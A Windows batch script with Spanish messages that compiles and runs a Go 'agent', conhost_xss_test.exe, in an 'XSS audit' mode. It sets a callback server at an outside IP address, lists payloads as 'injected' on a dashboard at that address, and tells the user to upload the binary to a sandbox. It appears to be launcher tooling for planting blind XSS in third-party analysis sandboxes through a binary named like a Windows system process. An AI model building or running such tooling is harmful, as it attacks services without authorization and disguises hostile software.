@echo off
echo ========================================
echo 🎯 Test de XSS Audit Mode
echo ========================================
echo.

REM Verificar que existe el .env
if not exist .env (
    echo [ERROR] Archivo .env no encontrado
    echo Copia .env.example a .env y configura XSS_AUDIT=true
    pause
    exit /b 1
)

REM Verificar que XSS_AUDIT está activado
findstr /C:"XSS_AUDIT=true" .env >nul
if errorlevel 1 (
    echo [ADVERTENCIA] XSS_AUDIT no está activado en .env
    echo.
    echo Para activar el modo XSS Audit:
    echo 1. Edita el archivo .env
    echo 2. Cambia XSS_AUDIT=false a XSS_AUDIT=true
    echo 3. Configura CALLBACK_SERVER=http://54.37.226.179
    echo.
    pause
    exit /b 1
)

echo [OK] XSS_AUDIT está activado
echo.

REM Compilar
echo [*] Compilando agente...
go build -o conhost_xss_test.exe
if errorlevel 1 (
    echo [ERROR] Error al compilar
    pause
    exit /b 1
)
echo [OK] Compilación exitosa
echo.

REM Ejecutar
echo [*] Ejecutando agente en modo XSS Audit...
echo.
echo ========================================
conhost_xss_test.exe
echo ========================================
echo.

echo [*] Ejecución completada
echo.
echo Verifica el dashboard para ver los payloads inyectados:
echo http://54.37.226.179/xss-audit/dashboard/
echo.
echo Los payloads están en estado "injected" esperando ser triggerados.
echo Sube este binario a un sandbox para probar.
echo.
pause
